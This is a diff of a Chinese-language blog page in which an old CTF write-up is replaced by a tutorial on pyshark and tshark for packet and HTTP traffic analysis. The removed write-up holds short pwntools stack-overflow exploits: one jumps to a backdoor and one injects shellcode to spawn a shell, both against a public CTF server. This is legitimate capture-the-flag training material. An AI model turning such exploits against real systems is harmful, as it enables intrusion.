@@ -15,33 +15,18 @@
 
 
 
-<meta name="description" content="最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.">
+<meta name="description" content="PyShark 是一个Python库，它提供了一个方便的接口来使用Wireshark的命令行工具tshark进行包解析。它是基于Wireshark开发的，，你可以直接在Python中利用Wireshark强大的解析器处理捕获文件或实时数据流。但是网上对使用pyshark来分析http流量的说明文章太少，于是手动记录下。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xman pwn题复现——学pwn小记（4）">
-<meta property="og:url" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="pyshark使用技巧小结">
+<meta property="og:url" content="lexsd6.github.io/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.">
+<meta property="og:description" content="PyShark 是一个Python库，它提供了一个方便的接口来使用Wireshark的命令行工具tshark进行包解析。它是基于Wireshark开发的，，你可以直接在Python中利用Wireshark强大的解析器处理捕获文件或实时数据流。但是网上对使用pyshark来分析http流量的说明文章太少，于是手动记录下。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113124043442.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113123620972.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113131440686.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132618818.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132742912.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132512530.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135133488.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135547290.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135742482.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140015120.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140431065.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140350462.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113141628743.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113142124824.png">
-<meta property="article:published_time" content="2021-01-07T13:44:11.943Z">
-<meta property="article:modified_time" content="2021-01-13T07:09:11.657Z">
+<meta property="article:published_time" content="2025-09-01T01:59:36.000Z">
+<meta property="article:modified_time" content="2025-09-05T16:04:10.281Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113124043442.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -75,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>xman pwn题复现——学pwn小记（4） | lexsd6&#39;s home</title>
+<title>pyshark使用技巧小结 | lexsd6&#39;s home</title>
 
 <script src="//lexsd6.github.io/js/jquery.min.js"></script>
 <script src="//lexsd6.github.io/js/clipboard.min.js"></script>
@@ -290,11 +275,11 @@
 
 
 
-<article id="post-xman pwn题复现" class="article article-type-post" itemscope itemprop="blogPost">
+<article id="post-pyshark与Wireshark使用用技巧小结" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-date">
-      <time datetime="2021-01-07T13:44:11.943Z" itemprop="datePublished">2021-01-07</time>
+      <a href="/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/" class="article-date">
+      <time datetime="2025-09-01T01:59:36.000Z" itemprop="datePublished">2025-09-01</time>
 </a>
 
 
@@ -309,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      xman pwn题复现——学pwn小记（4）
+      pyshark使用技巧小结
     </h1>
   
 
@@ -319,7 +304,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">888字</span>
+        <span class="post-count">2.6k字</span>
       </span>
     </span>
     <span class="post-time">
@@ -327,7 +312,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">阅读时长:</span>
-        <span class="post-count">4分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
 </div>
@@ -338,13 +323,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    <a class="article-category-link" href="/categories/tools/">tools</a>
     </div>
 
 
         
     <div class="article-tag tagcloud" >
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>
 
     </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
@@ -355,61 +340,259 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.<a id="more"></a></p>
-<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>最简单的,栈溢出.</p>
-<p><img src="image-20210113124043442.png" alt="image-20210113124043442"></p>
-<p>只开了NX保护.看反汇编代码发现,有栈溢出点.同时内部有后门.</p>
-<p><img src="image-20210113123620972.png" alt="image-20210113123620972"></p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level0'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'callsystem'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>PyShark 是一个Python库，它提供了一个方便的接口来使用Wireshark的命令行工具tshark进行包解析。它是基于Wireshark开发的，，你可以直接在Python中利用Wireshark强大的解析器处理捕获文件或实时数据流。但是网上对使用pyshark来分析http流量的说明文章太少，于是手动记录下。<a id="more"></a></p>
+<h2 id="pyshark的基础使用"><a href="#pyshark的基础使用" class="headerlink" title="pyshark的基础使用"></a>pyshark的基础使用</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><h4 id="1‑1-先确保你已安装-Wireshark-tshark"><a href="#1‑1-先确保你已安装-Wireshark-tshark" class="headerlink" title="1‑1. 先确保你已安装 Wireshark / tshark"></a>1‑1. 先确保你已安装 Wireshark / tshark</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian/Ubuntu</span></span><br><span class="line">sudo apt-get install wireshark tshark</span><br><span class="line"></span><br><span class="line"><span class="comment"># macOS (Homebrew)</span></span><br><span class="line">brew install wireshark</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line"><span class="comment"># 下载并安装 Wireshark，勾选 “tshark” 组件即可</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><p><img src="image-20210113131440686.png" alt="image-20210113131440686"></p>
-<p>还是只开了nx保护.</p>
-<p><img src="image-20210113132618818.png" alt="image-20210113132618818"></p>
-<p>发现有栈溢出利用点与后门.</p>
-<p>但是要注意的是这道题的mian函数.</p>
-<p><img src="image-20210113132742912.png" alt="image-20210113132742912"></p>
-<p>我们正常的mian函数一般是如下:</p>
-<p><img src="image-20210113132512530.png" alt="image-20210113132512530"></p>
-<p>即是有:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rbp     <span class="comment">#把上一个栈的rbp入栈</span></span><br><span class="line">mov rbp,rsp</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">leave    <span class="comment"># leave 相当于mov esp,ebp;pop ebp;</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>注意</strong>：在 Linux 上，你可能需要把当前用户加入 <code>wireshark</code> 组或使用 <code>sudo</code> 执行 tshark。</p>
+</blockquote>
+<h4 id="1‑2-安装-PyShark"><a href="#1‑2-安装-PyShark" class="headerlink" title="1‑2. 安装 PyShark"></a>1‑2. 安装 PyShark</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyshark</span><br></pre></td></tr></table></figure>
 
-<p>我们在平常里构造栈出时：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf+(0xbeadcade)+恶意code</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果你想要支持更高版本的 tshark，建议先更新 Wireshark，然后再安装/升级 pyshark。</p>
+</blockquote>
+<hr>
+<h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2. 基本概念"></a>2. 基本概念</h3><table>
+<thead>
+<tr>
+<th>对象</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>FileCapture</code></td>
+<td>从已有 <code>.pcap/.pcapng</code> 文件读取包</td>
+</tr>
+<tr>
+<td><code>LiveCapture</code></td>
+<td>在指定网络接口上实时捕获包</td>
+</tr>
+<tr>
+<td><code>Packet</code></td>
+<td>单个协议帧/数据包/数据报，提供访问字段的方法</td>
+</tr>
+<tr>
+<td><code>Layer</code></td>
+<td>协议层（Ethernet、IP、TCP 等），可通过属性或字典方式访问</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="3-基本使用"><a href="#3-基本使用" class="headerlink" title="3.基本使用"></a>3.基本使用</h3><h4 id="FileCapture与LiveCapture的读取方法"><a href="#FileCapture与LiveCapture的读取方法" class="headerlink" title="FileCapture与LiveCapture的读取方法"></a><code>FileCapture</code>与<code>LiveCapture</code>的读取方法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">pcap_path = Path(<span class="string">r"att.pcapng"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ① 检查文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> pcap_path.is_file():</span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">f"File <span class="subst">&#123;pcap_path&#125;</span> does not exist."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ②-1 创建捕获实例，使用 keep_packets=False 减少内存占用</span></span><br><span class="line">capture = pyshark.FileCapture(</span><br><span class="line">    str(pcap_path),</span><br><span class="line">    keep_packets=<span class="literal">False</span>,          <span class="comment"># 不缓存已读取的包</span></span><br><span class="line">    display_filter=<span class="string">'ip'</span>,         <span class="comment"># 只解析 IP 包（可根据需求调整）</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">##PS：从网卡中直接读取流量包</span></span><br><span class="line"><span class="comment">#capture 2 = pyshark.LiveCapture(interface='en0', display_filter="tcp.analysis.retransmission")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ③ 遍历并安全访问字段</span></span><br><span class="line"><span class="keyword">for</span> pkt <span class="keyword">in</span> capture:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        src_ip = pkt.ip.src  <span class="comment">#获得原地址</span></span><br><span class="line">        dst_ip = pkt.ip.dst  <span class="comment">#获得目的地址</span></span><br><span class="line">        protocol = pkt.transport_layer <span class="keyword">or</span> <span class="string">'Unknown'</span> <span class="comment">#传输层协议</span></span><br><span class="line">        print(<span class="string">f"Packet: <span class="subst">&#123;protocol&#125;</span> from <span class="subst">&#123;src_ip&#125;</span> to <span class="subst">&#123;dst_ip&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 该包没有 IP 层，或者某字段缺失</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ④ 关闭资源（可选，因为捕获对象会在 GC 时自动关闭）</span></span><br><span class="line">capture.close()</span><br></pre></td></tr></table></figure>
 
-<p>0xbeadcade的数据就为了平衡leave中的pop，因此在本题目中mian函数没有pop ebp或leave。因此payload不需要加(0xbeadcade)。</p>
-<p>exp：</p>
-<p><img src="image-20210113135133488.png" alt="image-20210113135133488"></p>
-<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>一个32位的程序，什么保护也没有开。</p>
-<p><img src="image-20210113135547290.png" alt="image-20210113135547290"></p>
-<p>反汇编看，发现buf有可控栈溢出，同时提示了buf地址猜测可以手动入shell。</p>
-<p><img src="image-20210113135742482.png" alt="image-20210113135742482"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'level1'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment">#p=process('level1')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's this:"</span>)</span><br><span class="line">addr=p.recvuntil(<span class="string">"?"</span>)[:<span class="number">-1</span>]</span><br><span class="line">print(addr)</span><br><span class="line">addr=int(addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pay1=asm(shellcraft.sh())</span><br><span class="line">pay1=pay1.ljust(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">pay1=pay1+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>​    代码说明，通过<code>pyshark.FileCapture</code>和<code>pyshark.LiveCapture</code> 获得的 <strong>capture</strong>的变量是一个FileCapture对象，我们可以里理解为被pyshark的流量包文件对象。而代码中<strong>pkt</strong>变量是一个<strong>Packet</strong>对象可以理解为流量包文件每一个的每一个流量包。而流量包的读取顺序则是和 Wireshark中<code>No.</code>的顺序是相似的(在通过 display_filter过滤后流量包的读取顺序再用索引下标读取的话pyshark会对流量包重新排序)。</p>
+<p>​    而且<code>pyshark.FileCapture</code>和<code>pyshark.LiveCapture</code> 通常情况下我们只需要<code>input_file</code>指定文件或<code>interface</code>指定对应网卡，就可以分析到流量包。但为了分析方便开发者加了扩展参数来自进行分析，我对<code>pyshark.FileCapture</code>和<code>pyshark.LiveCapture</code> 的常见的参数/扩展参数总结如下：</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">作用</th>
+<th align="left">默认值</th>
+<th align="left">使用建议 / 注意事项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>keep_packets</strong></td>
+<td align="left">是否在读取后保留已读的包对象。<br>True → 内存中保存所有 <code>Packet</code>；False → 只返回一个包，随后被 GC 回收。</td>
+<td align="left">True</td>
+<td align="left">大文件（GB+）时建议设为 False，以防内存爆炸。</td>
+</tr>
+<tr>
+<td align="left"><strong>input_file</strong></td>
+<td align="left">指定要读取的捕获文件或 XML<br>可直接传入路径字符串、Path 对象或已打开的文件句柄（<code>io.BufferedReader</code>）。</td>
+<td align="left">None (必须提供)</td>
+<td align="left">只在 <code>FileCapture</code> 中使用；若为文件句柄，tshark 会从当前位置开始读。</td>
+</tr>
+<tr>
+<td align="left"><strong>ring_file_size</strong></td>
+<td align="left">循环文件大小（kB）<br>当使用 <code>output_file</code> 或开启循环写入时，tshark 会把抓到的包写成一系列 “环形” 文件。</td>
+<td align="left">1024 kB (1 MiB)</td>
+<td align="left">对高流量捕获建议增大；过小会导致文件频繁切换、磁盘 I/O 增加。</td>
+</tr>
+<tr>
+<td align="left"><strong>num_ring_files</strong></td>
+<td align="left">循环文件数量<br>保留的文件数，tshark 会在此数目后循环覆盖旧文件。</td>
+<td align="left">1</td>
+<td align="left">典型场景：想把最近 5 MiB 数据保存下来，只需 <code>num_ring_files=5</code>。</td>
+</tr>
+<tr>
+<td align="left"><strong>ring_file_name</strong></td>
+<td align="left">循环文件基础名<br>实际写出的文件会以 <code>&lt;name&gt;.0</code>, <code>&lt;name&gt;.1</code>, … 命名。</td>
+<td align="left"><code>/tmp/pyshark.pcap</code></td>
+<td align="left">在 Windows 建议改为 <code>C:\\temp\\pyshark.pcap</code>，避免路径中的斜杠被误解析。</td>
+</tr>
+<tr>
+<td align="left"><strong>interface</strong></td>
+<td align="left">抓包的网卡名称<br>如果不指定，tshark 会自动选第一个可用接口。</td>
+<td align="left">第一个可用接口</td>
+<td align="left">对多网卡机器一定要明确写 <code>interface=&#39;eth0&#39;</code> 或者 <code>en0</code>（macOS）。</td>
+</tr>
+<tr>
+<td align="left"><strong>bpf_filter</strong></td>
+<td align="left">BPF 过滤器（Berkeley Packet Filter）<br>在捕获层面就筛选掉不需要的包，速度快。</td>
+<td align="left">None</td>
+<td align="left">示例：<code>bpf_filter=&#39;tcp port 80&#39;</code>；注意：BPF 与 Wireshark 的显示过滤不同。</td>
+</tr>
+<tr>
+<td align="left"><strong>display_filter</strong></td>
+<td align="left">Wireshark 显示过滤（tshark 层面的 <code>-Y</code>）<br>在解析后再筛选，功能更强大但开销较大。</td>
+<td align="left">None</td>
+<td align="left">示例：<code>display_filter=&#39;http.request&#39;</code>；如果你只需要 IP/TCP/UDP 信息，可把它留空或使用 BPF。</td>
+</tr>
+<tr>
+<td align="left"><strong>only_summaries</strong></td>
+<td align="left">仅生成包摘要<br>不解析完整协议层，速度快且内存占用低。</td>
+<td align="left">False</td>
+<td align="left">对日志收集、流量计数非常合适；但无法获取字段值，只能拿到 <code>pkt.summary</code>。</td>
+</tr>
+<tr>
+<td align="left"><strong>disable_protocol</strong></td>
+<td align="left">禁用某个协议的检测（tshark &gt; 2）<br>可加速解析，尤其是你知道不需要某些大协议时。</td>
+<td align="left">None</td>
+<td align="left">用法：<code>disable_protocol=&#39;ssl&#39;</code>；如果禁用了错误协议，后续访问会报错。</td>
+</tr>
+<tr>
+<td align="left"><strong>decryption_key</strong></td>
+<td align="left">对加密流量进行解密<br>用于 Wi-Fi 或 VPN 等加密捕获。</td>
+<td align="left">None</td>
+<td align="left">需要对应 <code>encryption_type</code>；若未正确设置，tshark 会忽略此字段。</td>
+</tr>
+<tr>
+<td align="left"><strong>encryption_type</strong></td>
+<td align="left">指定加密标准<br>必须是 <code>&#39;WEP&#39;</code>, <code>&#39;WPA-PWD&#39;</code>, 或 <code>&#39;WPA-PWK&#39;</code>（默认 WPA-PWK）。</td>
+<td align="left"><code>&#39;WPA-PWK&#39;</code></td>
+<td align="left">与 <code>decryption_key</code> 配合使用；若不匹配，解密失败。</td>
+</tr>
+<tr>
+<td align="left"><strong>tshark_path</strong></td>
+<td align="left">tshark 可执行文件的完整路径<br>如果系统 PATH 中没有 <code>tshark</code> 或你想指定特定版本。</td>
+<td align="left">自动搜索</td>
+<td align="left">在 Windows 上常用：<code>r&#39;C:\Program Files\Wireshark\tshark.exe&#39;</code>。</td>
+</tr>
+<tr>
+<td align="left"><strong>output_file</strong></td>
+<td align="left">把抓到的数据写入文件（可与 <code>ring_file_*</code> 配合）<br>即使你不想保存，也可以把它设为 <code>None</code> 或省略。</td>
+<td align="left">None</td>
+<td align="left">若同时指定了 <code>ring_file_name</code>，tshark 会将数据写成环形；否则直接写一个普通 pcap 文件。</td>
+</tr>
+</tbody></table>
+<h4 id="Packet对象"><a href="#Packet对象" class="headerlink" title="Packet对象"></a><strong>Packet</strong>对象</h4><p>再说回<strong>Packet</strong>对象，一个Packet本质上就对应一个流量包，在pyshark中提供了如下基础方法:</p>
+<ul>
+<li><strong><code>layers</code></strong>: 获取数据包Packe所有的协议</li>
+<li><strong><code>get_multiple_layers(layer_name)</code></strong>: 获取数据包中指定名称的多个层（例如，一个数据包中可能有多个IP层）</li>
+<li><strong><code>get_raw_packet()</code></strong>: 获取原始的字节数据包</li>
+<li><strong><code>highest_layer</code></strong>: 返回数据包的最高协议层（例如，应用层协议名称）</li>
+<li><strong><code>pretty_print()</code></strong>: 以美观的格式打印数据包详情</li>
+<li><strong><code>show()</code></strong>: 类似于 <code>pretty_print()</code>，用于显示数据包详情</li>
+<li><strong><code>sniff_time</code></strong>: 数据包被捕获的时间戳</li>
+<li><strong><code>transport_layer</code></strong>: 返回传输层协议（如TCP或UDP）</li>
+</ul>
+<h4 id="Layer对象"><a href="#Layer对象" class="headerlink" title="Layer对象"></a><strong>Layer</strong>对象</h4><p>这样我们从<strong>Packet</strong>对象获得到<strong>Layer</strong>对象，<strong>Layer</strong>对象对应会根据协议的不同，给我们提供不同的方法。比如<strong>TCP Layer</strong>协议对象会给我们提供：</p>
+<ul>
+<li><strong><code>srcport</code></strong>: 源端口号</li>
+<li><strong><code>dstport</code></strong>: 目标端口号</li>
+<li><strong><code>port</code></strong>: 可能是源端口或目标端口（取决于上下文）</li>
+<li><strong><code>seq</code></strong>: 序列号（可能经过相对处理）</li>
+<li><strong><code>seq_raw</code></strong>: 原始序列号</li>
+<li><strong><code>ack</code></strong>: 确认号（可能经过相对处理）</li>
+<li><strong><code>ack_raw</code></strong>: 原始确认号</li>
+<li><strong><code>nxtseq</code></strong>: 下一个序列号</li>
+<li><strong><code>stream</code></strong>: TCP流索引（等同于Wireshark中的<code>tcp.stream</code>）</li>
+<li><strong><code>checksum</code></strong>: 校验和</li>
+<li><strong><code>checksum_status</code></strong>: 校验和状态</li>
+<li><strong><code>len</code></strong>: TCP段长度</li>
+<li><strong><code>hdr_len</code></strong>: TCP头部长度</li>
+<li><strong><code>time_relative</code></strong>: 相对于第一个数据包的时间</li>
+<li><strong><code>time_delta</code></strong>: 与前一个数据包的时间差</li>
+<li><strong><code>analysis</code></strong>: 分析信息</li>
+<li><strong><code>completeness</code></strong>: 连接完整性状态</li>
+</ul>
+<p>而<strong>IP Layer</strong> 协议会给我们提供<strong>ipv4</strong>相关网络成相关的协议的方法（ps:如果是ipv6 则是IPV6 Layer ，在pyshark中这里有区分的）：</p>
+<ul>
+<li><strong><code>src</code></strong>: 源IP地址</li>
+<li><strong><code>dst</code></strong>: 目标IP地址</li>
+<li><strong><code>addr</code></strong>: 可能是源或目标IP地址（取决于上下文）</li>
+<li><strong><code>dst_host</code></strong>: 目标主机地址</li>
+<li><strong><code>version</code></strong>: IP版本（通常是4或6）</li>
+<li><strong><code>hdr_len</code></strong>: IP头部长度</li>
+<li><strong><code>dsfield</code></strong>: 区分服务字段（DS Field）</li>
+<li><strong><code>dsfield_dscp</code></strong>: 差分服务代码点（DSCP）</li>
+<li><strong><code>dsfield_ecn</code></strong>: 显式拥塞通知（ECN）</li>
+<li><strong><code>len</code></strong>: IP数据包总长度</li>
+<li><strong><code>id</code></strong>: 标识字段（用于分片和重组）</li>
+<li><strong><code>flags</code></strong>: 标志位</li>
+</ul>
+<h2 id="pyshark分析http流量"><a href="#pyshark分析http流量" class="headerlink" title="pyshark分析http流量"></a>pyshark分析http流量</h2><p>同样pyshark的提供了<code>HTTP Layer</code>的方法来对http流量进行分析。常见的方法如下：</p>
+<table>
+<thead>
+<tr>
+<th>用途</th>
+<th>属性方法</th>
+<th>结果示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>请求方法</strong></td>
+<td><code>request_method</code></td>
+<td><code>GET</code>, <code>POST</code></td>
+</tr>
+<tr>
+<td><strong>完整 URI</strong></td>
+<td><code>request_full_uri</code></td>
+<td><code>https://example.com/api?x=1</code></td>
+</tr>
+<tr>
+<td><strong>URI 片段</strong></td>
+<td><code>request_uri</code></td>
+<td><code>/api?x=1</code></td>
+</tr>
+<tr>
+<td><strong>HTTP 版本</strong></td>
+<td><code>request_version</code> / <code>response_version</code></td>
+<td><code>HTTP/1.1</code></td>
+</tr>
+<tr>
+<td><strong>状态码</strong></td>
+<td><code>response_code</code></td>
+<td><code>200</code></td>
+</tr>
+<tr>
+<td><strong>响应文本</strong></td>
+<td><code>response_phrase</code></td>
+<td><code>OK</code></td>
+</tr>
+<tr>
+<td><strong>内容类型</strong></td>
+<td><code>content_type</code></td>
+<td><code>application/json</code></td>
+</tr>
+<tr>
+<td><strong>Cookie</strong></td>
+<td><code>cookie_pair</code> / <code>set_cookie</code></td>
+<td><code>sessionid=abc123; ...</code></td>
+</tr>
+</tbody></table>
+<p>在抓取 HTTP 流量时，需要注意 <strong>请求包</strong> 与 <strong>响应包</strong> 的区别。PyShark 在读取 HTTP 包时，只是粗略地保留了一些属性，并没有为它们做出专门的区分。因此，如果你在遍历包时对一个请求包使用了仅存在于响应包中的属性（例如 <code>response_code</code>、<code>response_phrase</code>），就会导致报错。</p>
+<p>解决办法很简单：</p>
+<ul>
+<li><strong>请求包</strong> 具有 <code>request_method</code> 属性；</li>
+<li><strong>响应包</strong> 具有 <code>response_code</code> 属性。</li>
+</ul>
+<p>先根据这两个标识判断包的类型，再使用对应的属性进行处理，就能避免错误。</p>
+<p>另一个常见需求是提取 HTTP 包中的主体数据：</p>
+<ul>
+<li>对于请求包，获取的是请求体（body）；</li>
+<li>对于响应包，获取的是返回体（body）。</li>
+</ul>
+<p>在处理时同样需要先区分包类型，然后再调用相应的属性或方法来读取主体内容。</p>
